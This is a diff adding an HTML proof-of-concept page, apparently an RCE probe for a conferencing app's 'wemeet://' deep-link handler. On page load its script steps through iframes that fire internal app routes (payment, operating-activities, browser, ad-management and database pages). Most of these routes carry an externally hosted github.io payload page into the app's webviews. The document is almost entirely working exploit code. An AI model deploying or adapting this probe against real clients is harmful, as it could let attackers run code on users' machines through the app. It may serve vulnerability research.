@@ -1,0 +1,32 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>WM-POC-OK</title></head>
+<body><h1>WM-POC-P10</h1>
+<script>
+document.title='P10-START';
+var pay='https://gitwhs.github.io/wm-poc-rce/probe9pay.html';
+function frame(src, label){
+  document.title=label;
+  var f=document.createElement('iframe');
+  f.src=src;
+  document.body.appendChild(f);
+}
+var steps=[
+  function(){ frame('wemeet://page/pay/main_process_webview?url='+encodeURIComponent(pay),'P10-PAYMP'); },
+  function(){ frame('wemeet://page/operating_activities/main_process_webview?url='+encodeURIComponent(pay),'P10-OPMP'); },
+  function(){ frame('wemeet://page/operating_activities/webview_content?url='+encodeURIComponent(pay),'P10-OPWV'); },
+  function(){ frame('wemeet://page/nxui/webview?url='+encodeURIComponent(pay),'P10-NX'); },
+  function(){ frame('wemeet://page/home_mask_webview?url='+encodeURIComponent(pay),'P10-MASK'); },
+  function(){ frame('wemeet://page/database_operation','P10-DB'); },
+  function(){ frame('wemeet://browser?url='+encodeURIComponent(pay),'P10-BR'); },
+  function(){ frame('wemeet://page/private_ad_mgt?url='+encodeURIComponent(pay),'P10-AD'); }
+];
+var i=0;
+function next(){
+  if(i>=steps.length){ document.title='P10-DONE'; return; }
+  try{ steps[i](); }catch(e){ document.title='P10-EX'; }
+  i++;
+  setTimeout(next, 3500);
+}
+setTimeout(next, 500);
+</script>
+</body></html>
